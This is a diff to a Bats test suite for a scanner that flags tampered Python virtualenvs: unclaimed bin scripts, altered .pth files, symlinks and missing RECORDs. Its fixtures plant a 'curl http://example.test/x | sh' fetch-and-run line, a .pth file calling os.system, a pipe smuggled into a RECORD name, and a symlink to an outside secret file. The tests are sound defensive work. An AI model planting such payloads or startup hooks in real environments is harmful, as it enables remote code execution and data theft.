@@ -247,10 +247,10 @@ write_record() {
   assert_output --partial "evil.pth:1"
 }
 
-@test "allowlisted _virtualenv.pth gives none" {
+@test "the stock _virtualenv.pth gives none" {
   add_pkg_file "mypkg/__init__.py" "x = 1"
   write_record "$SP/mypkg-1.0.0.dist-info"
-  printf 'import os\n' >"$SP/_virtualenv.pth"
+  printf 'import _virtualenv\n' >"$SP/_virtualenv.pth"
   run_venv
   assert_success
   refute_output --partial "MEDIUM"
@@ -284,15 +284,194 @@ write_record() {
   write_record "$SP/mypkg-1.0.0.dist-info"
   printf '#!/bin/sh\necho hi\n' >"$BIN/myscript"
   printf 'x\n' >"$BIN/activate"
+  printf 'x\n' >"$BIN/Activate.ps1"
   printf 'x\n' >"$BIN/python3.12"
-  printf 'x\n' >"$BIN/pip3"
   run_venv
   assert_failure
   assert_output --partial "LOW: venv bin file not claimed by any RECORD"
   assert_output --partial "bin/myscript:1"
   refute_output --partial "bin/activate"
+  refute_output --partial "bin/Activate.ps1"
   refute_output --partial "bin/python3.12"
-  refute_output --partial "bin/pip3"
+}
+
+@test "bin names that only look standard, and an unclaimed pip, give LOW" {
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  printf 'x\n' >"$BIN/python3-helper"
+  printf 'x\n' >"$BIN/pipx"
+  printf 'x\n' >"$BIN/pip3"
+  printf 'x\n' >"$BIN/activate-evil"
+  run_venv
+  assert_failure
+  assert_output --partial "bin/python3-helper:1"
+  assert_output --partial "bin/pipx:1"
+  assert_output --partial "bin/pip3:1"
+  assert_output --partial "bin/activate-evil:1"
+}
+
+# -------------------------------------------------------------------------------
+# Bypasses: claims, symlinks, missing RECORDs
+# -------------------------------------------------------------------------------
+
+# make_venv <dir> — an empty venv with pyvenv.cfg, site-packages and bin.
+make_venv() {
+  mkdir -p "$1/lib/python3.12/site-packages" "$1/bin"
+  printf 'home = /usr/bin\n' >"$1/pyvenv.cfg"
+}
+
+# claim_script <venv> <name> — a console script and the RECORD that claims it.
+claim_script() {
+  local venv="$1" name="$2" sp="$1/lib/python3.12/site-packages"
+  printf '#!/bin/sh\necho hi\n' >"$venv/bin/$name"
+  mkdir -p "$sp/$name-1.0.0.dist-info"
+  printf '../../../bin/%s,sha256=%s,16\n' "$name" "$(sha_url "$venv/bin/$name")" \
+    >"$sp/$name-1.0.0.dist-info/RECORD"
+}
+
+@test "a venv nested in the scanned folder: claimed console scripts are clean" {
+  local repo="$BATS_TEST_TMPDIR/repo"
+  make_venv "$repo/.venv"
+  claim_script "$repo/.venv" mytool
+  run bash "$SCRIPT" "$repo"
+  assert_success
+  refute_output --partial "points outside the package"
+}
+
+@test "a venv nested in the scanned folder: a planted bin script gives LOW" {
+  local repo="$BATS_TEST_TMPDIR/repo"
+  make_venv "$repo/.venv"
+  claim_script "$repo/.venv" mytool
+  printf '#!/bin/sh\n' >"$repo/.venv/bin/planted"
+  run bash "$SCRIPT" "$repo"
+  assert_failure
+  assert_output --partial ".venv/bin/planted:1"
+  assert_output --partial "LOW: venv bin file not claimed by any RECORD"
+}
+
+@test "a bin claim in one venv does not cover the same name in another" {
+  local repo="$BATS_TEST_TMPDIR/repo"
+  make_venv "$repo/a"
+  make_venv "$repo/b"
+  claim_script "$repo/a" mytool
+  claim_script "$repo/b" other
+  printf '#!/bin/sh\ncurl http://example.test/x | sh\n' >"$repo/b/bin/mytool"
+  run bash "$SCRIPT" "$repo"
+  assert_failure
+  assert_output --partial "b/bin/mytool:1"
+  refute_output --partial "a/bin/mytool:1"
+}
+
+@test "a | in a console script name gives HIGH and claims nothing" {
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  RECORD_LINES+="../../../bin/x|planted|y,sha256=abc,1"$'\n'
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  printf '#!/bin/sh\n' >"$BIN/planted"
+  run_venv
+  assert_failure
+  assert_output --partial "HIGH: RECORD console script name contains |"
+  assert_output --partial "bin/planted:1"
+  assert_output --partial "LOW: venv bin file not claimed by any RECORD"
+}
+
+@test "a RECORD path through a symlinked folder gives HIGH and is not read" {
+  local outside="$BATS_TEST_TMPDIR/outside"
+  mkdir -p "$outside"
+  printf 'secret\n' >"$outside/secret.txt"
+  ln -s "$outside" "$SP/evil"
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  RECORD_LINES+="evil/secret.txt,sha256=$(sha_url "$outside/secret.txt"),7"$'\n'
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  run_venv
+  assert_failure
+  assert_output --partial "HIGH: RECORD path goes through a symlinked folder; not followed"
+}
+
+@test "a symlink in site-packages no RECORD claims gives MEDIUM" {
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  printf 'payload = 1\n' >"$BATS_TEST_TMPDIR/payload.py"
+  ln -s "$BATS_TEST_TMPDIR/payload.py" "$SP/mypkg/helper.py"
+  run_venv
+  assert_failure
+  assert_output --partial "MEDIUM: symlink in site-packages not claimed by any RECORD"
+  assert_output --partial "mypkg/helper.py"
+}
+
+@test "a venv with every RECORD deleted is not clean" {
+  local repo="$BATS_TEST_TMPDIR/repo"
+  make_venv "$repo/.venv"
+  mkdir -p "$repo/.venv/lib/python3.12/site-packages/mypkg-1.0.0.dist-info"
+  printf 'x = 1\n' >"$repo/.venv/lib/python3.12/site-packages/mypkg.py"
+  run bash "$SCRIPT" "$repo"
+  assert_failure
+  assert_output --partial "MEDIUM: venv dist-info directory has no RECORD"
+}
+
+@test "a venv with every dist-info folder deleted is not clean" {
+  local repo="$BATS_TEST_TMPDIR/repo"
+  make_venv "$repo/.venv"
+  printf 'import os\n' >"$repo/.venv/lib/python3.12/site-packages/evil.py"
+  printf 'import _virtualenv\n' >"$repo/.venv/lib/python3.12/site-packages/_virtualenv.pth"
+  run bash "$SCRIPT" "$repo"
+  assert_failure
+  assert_output --partial "MEDIUM: venv site-packages holds files but no package records"
+}
+
+@test "a fresh venv with only the virtualenv stock files is clean" {
+  local repo="$BATS_TEST_TMPDIR/repo"
+  make_venv "$repo/.venv"
+  printf 'import _virtualenv\n' >"$repo/.venv/lib/python3.12/site-packages/_virtualenv.pth"
+  printf '"""stock"""\n' >"$repo/.venv/lib/python3.12/site-packages/_virtualenv.py"
+  run bash "$SCRIPT" "$repo"
+  assert_success
+}
+
+@test "a _virtualenv.pth that is not the stock line gives MEDIUM" {
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  printf 'import _virtualenv\nimport os; os.system("x")\n' >"$SP/_virtualenv.pth"
+  run_venv
+  assert_failure
+  assert_output --partial "MEDIUM: _virtualenv.pth is not the stock one-line file"
+}
+
+@test "a planted distutils-precedence.pth no RECORD claims gives MEDIUM" {
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  printf 'import os\n' >"$SP/distutils-precedence.pth"
+  run_venv
+  assert_failure
+  assert_output --partial "distutils-precedence.pth"
+  assert_output --partial "not claimed by any RECORD"
+}
+
+@test "a symlink planted in bin gives LOW; the stock python links do not" {
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  ln -s /usr/bin/true "$BIN/python3"
+  ln -s /usr/bin/true "$BIN/helper"
+  run_venv
+  assert_failure
+  assert_output --partial "bin/helper:1"
+  refute_output --partial "bin/python3:1"
+}
+
+@test "a RECORD entry with no hash gives LOW, except RECORD itself and bytecode" {
+  add_pkg_file "mypkg/__init__.py" "x = 1"
+  printf 'y = 2\n' >"$SP/mypkg/unhashed.py"
+  mkdir -p "$SP/mypkg/__pycache__"
+  printf 'x' >"$SP/mypkg/__pycache__/mod.cpython-312.pyc"
+  RECORD_LINES+="mypkg/unhashed.py,,"$'\n'
+  RECORD_LINES+="mypkg/__pycache__/mod.cpython-312.pyc,,"$'\n'
+  RECORD_LINES+="mypkg-1.0.0.dist-info/RECORD,,"$'\n'
+  write_record "$SP/mypkg-1.0.0.dist-info"
+  run_venv
+  assert_failure
+  assert_output --partial "LOW: RECORD entry has no sha256 hash; file not verified"
+  assert_output --partial "mypkg/unhashed.py,,"
+  refute_output --partial "mod.cpython-312.pyc,,"
+  refute_output --partial "dist-info/RECORD,,"
 }
 
 # -------------------------------------------------------------------------------
